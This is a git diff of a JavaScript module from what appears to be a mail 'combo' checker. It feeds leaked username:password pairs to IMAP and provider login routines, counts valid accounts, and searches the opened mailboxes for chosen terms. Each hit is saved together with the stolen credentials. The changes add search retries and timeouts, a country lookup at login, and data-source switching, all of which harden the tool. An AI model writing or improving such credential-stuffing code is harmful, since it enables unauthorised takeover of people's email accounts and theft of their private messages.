@@ -1,7 +1,7 @@
 
 import mail from '../conf/servers.js'
 
-import datasource from './@data.js'
+import sqlite from './@data.js'
 
 import abv from './abv.js'
 import imap from './eyemap.js'
@@ -13,11 +13,15 @@ import async from 'async'
 import path from 'path'
 import fs from 'fs'
 
+import domainiac from 'domainiac'
+
 import { debuffer, datadir } from 'konsole';
 
 let debug = debuffer(datadir.share("combomail","logs")).logger("~mailserver");
 
 const resolver = factory().resolve;
+
+let datasource = sqlite();
 
 function loadsessions(){
 	const { map, combo, userdata } = datasource.session.load() || { map: {}, combo: [], userdata: {} };
@@ -81,14 +85,14 @@ function parseuser(lout) {
 function select(domain, email, tries) {
 	return new Promise(resolve=>{
 		
-		let server = mail[domain];
-		if (server) {
-			if (server[1] === 143 || server[1] === 993) return resolve(servers.imap(server[0], server[1]));
-			else resolve();
-
-		} else if (servers.outlook.COMMONMISTAKES.includes(domain)) {
+		let server;
+		if (servers.outlook.COMMONMISTAKES.includes(domain) || servers.imap.EXCLUDE.includes(domain)) {
 			resolve();
 			
+		} else if (server = mail[domain]) {
+			if (server[1] === 143 || server[1] === 993) return resolve(servers.imap.imap(server[0], server[1]));
+			else resolve();
+
 		} else if (servers.abv.DOMAINS.includes(domain)) {
 			return resolve(servers.abv);
 
@@ -235,7 +239,8 @@ function base({ pnid, action, term, combo }) {
 								}
 							}, 60000);
 
-							server.login(user, pass).then(async api => {
+							let country = domainiac.country(domain);
+							server.login(user, pass, domain, country).then(async api => {
 								clearTimeout(timedout);
 
 								if (!cancelled) {
@@ -243,20 +248,37 @@ function base({ pnid, action, term, combo }) {
 										stats.valid++
 
 										if (action === "search") {
-											const list = await api.search(term);
-											if (!list.error) {
-												if (list.results.length > 0) {
-													stats.hits++
-													list.user = user;
-													list.pass = pass;
-													list.domain = domain;
-													hitlist.push(list);
+											timedout = setTimeout(function(){
+												cancelled = true;
 
-													if (comms) comms.hits(list);
+												if (tries < 3) {
+													execute(tries+1)
+												} else {
+													cb2();
 												}
-											} else  {
-												debug.log(`Search Error (${server.name}):`, list.error);
-											}
+											}, 120000);
+
+											api.search(term).then(list=>{
+												clearTimeout(timedout);
+
+												if (!cancelled) {
+													if (!list.error) {
+														if (list.results.length > 0) {
+															stats.hits++
+															list.user = user;
+															list.pass = pass;
+															list.domain = domain;
+															hitlist.push(list);
+
+															if (comms) comms.hits(list);
+														}
+													} else  {
+														debug.log(`Search Error (${server.name}):`, list.error);
+													}
+												} else {
+													debug.log(`Search Timeout: 120 seconds`);
+												}
+											});
 										}
 									} else if (api.error){
 										debug.log(`Login Error (${server.name}):`, api.error);
@@ -264,6 +286,10 @@ function base({ pnid, action, term, combo }) {
 
 									stats.processed++
 									deletes.push(`${user}:${pass}`)
+									cb2();
+								
+								} else {
+									debug.log(`Login Timeout: 60 seconds`);
 									cb2();
 								}
 							})
@@ -362,6 +388,16 @@ process.on("SIGTERM", ifneedtoabort);
 process.on("SIGBREAK", ifneedtoabort);
 
 export default {
+
+	sourcename({ source }) {
+		datasource = sqlite(source);
+		sessions = loadsessions();
+		resolve({
+			action: "sourcename",
+			valid: sessions.valid
+		})
+	},
+
 	combo({ combo }) {
 		return base({ action: "combo", combo })
 	},
@@ -412,7 +448,7 @@ export default {
 				queue.push(function(cb){
 					try {
 						let o = JSON.parse(s);
-						datasource.session.import(o);
+						datasource.session.create(o);
 					} catch(e) {
 						// Line Didn't Parse
 					} finally {
@@ -476,6 +512,12 @@ export default {
 		})
 	},
 
+	userdata({ user }) {
+		let userdata = datasource.session.userdata({ user });
+		userdata.action = "userdata";
+		return userdata;
+	},
+ 
 	begin() {
 		let query, message = { 
 			action: "begin",
